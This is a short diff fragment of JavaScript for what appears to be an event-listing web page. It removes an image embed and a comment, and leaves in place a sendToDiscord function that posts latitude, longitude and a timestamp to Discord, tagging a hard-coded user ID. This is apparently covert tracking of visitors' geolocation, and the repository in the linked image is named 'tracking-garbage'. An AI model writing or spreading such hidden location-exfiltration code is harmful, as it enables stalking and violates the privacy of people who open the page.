@@ -275,13 +275,6 @@
         const JanisUID = "789782857852911616"
         function sendToDiscord(latitude, longitude) {
     const payload = {
-        embeds: [
-            {
-                image: {
-                    url: "https://raw.githubusercontent.com/yhkq1/tracking-garbage/1e146e2c80794858dd8c6dd31eb50c9073e8a7a4/divider-36072_1.png"
-                }
-            }
-        ],
         content: `<@${JanisUID}>
 Latitude: ${latitude}
 Longitude: ${longitude}
@@ -310,8 +303,6 @@ Timestamp: ${new Date().toISOString()}`
             eventCards.forEach((card, index) => {
                 card.classList.remove('loading');
                 const content = card.querySelector('.event-card-content');
-                
-                // Simulated event details (you'd replace this with real API calls)
                 const events = [
                     { name: '', location: '', time: '' },
                     { name: '', location: '', time: '' },
